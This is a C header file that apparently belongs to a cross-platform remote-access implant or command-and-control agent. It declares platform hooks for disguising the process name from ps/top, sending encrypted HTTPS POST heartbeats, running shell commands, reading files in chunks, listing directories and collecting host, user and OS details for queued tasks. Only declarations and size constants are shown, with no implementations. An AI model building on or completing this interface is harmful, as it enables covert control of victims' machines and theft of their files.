#ifndef LITE_PORT_H
#define LITE_PORT_H

#include <stddef.h>
#include <stdint.h>

#define OUT_CAP       (60 * 1000) /* must stay under the u16 TLV length limit */
#define FILE_CHUNK    (48 * 1000) /* one heartbeat of file data; must stay under u16 TLV */
#define FILE_MAX      (20 * 1024 * 1024)
#define DIR_LIST_CAP  (60 * 1000) /* one directory listing; stays under u16 TLV with its header */
#define RESP_MAX_BODY (2 * 1024 * 1024)
#define WIRE_MAX      (RESP_MAX_BODY + 65536) /* headers plus a capped body */
#define RESULT_CAP    (1024 * 1024)           /* accumulated task output held in memory */
#define MAX_TASKS     32

/* Platform hooks implemented by linux.c / win.c / darwin.c. */

int  sys_init(void);
void sys_shutdown(void);

/* Best-effort runtime masquerade: change what ps/top display. */
void sys_set_procname(const char *name);

/* HTTPS POST; returns 0 on transport success. Caller frees *resp. */
int  http_post(const char *url, const char *ua, const char *body, size_t body_len,
               long *status_code, char **resp, size_t *resp_len);

int  sha256(const unsigned char *in, size_t n, unsigned char out[32]);
int  aes_gcm_seal(const unsigned char key[32], const unsigned char nonce[12],
                  const unsigned char *pt, size_t pt_len,
                  unsigned char *ct, size_t ct_len, unsigned char tag[16]);
int  aes_gcm_open(const unsigned char key[32], const unsigned char nonce[12],
                  const unsigned char *ct, size_t ct_len, const unsigned char tag[16],
                  unsigned char *pt, size_t pt_len);
void rand_bytes(unsigned char *out, size_t n);
uint64_t now_unix(void);
void sleep_sec(double seconds);

int  exec_cmd(const char *cmd, int timeout_sec, unsigned char **out, size_t *out_len, int *exit_code);
/* err_code: 0 ok, 1 missing, 2 denied, 3 too big, 4 short/changed. *total is the file size. */
int  read_file_chunk(const char *path, uint32_t offset, unsigned char **out, size_t *out_len, uint32_t *total, int *err_code);
/* Single-level directory listing, entries packed as
   [isdir:1][size:8][mtime:8][namelen:2][name] (little-endian).
   err_code: 0 ok, 1 missing, 2 denied/other, 3 not a directory.
   *truncated is set when entries did not fit the output cap. */
int  list_dir(const char *path, unsigned char **out, size_t *out_len, int *err_code, int *truncated);
void host_info(char *hostname, size_t hn, char *username, size_t un,
               char *os, size_t on, char *arch, size_t an, uint32_t *pid);

#endif
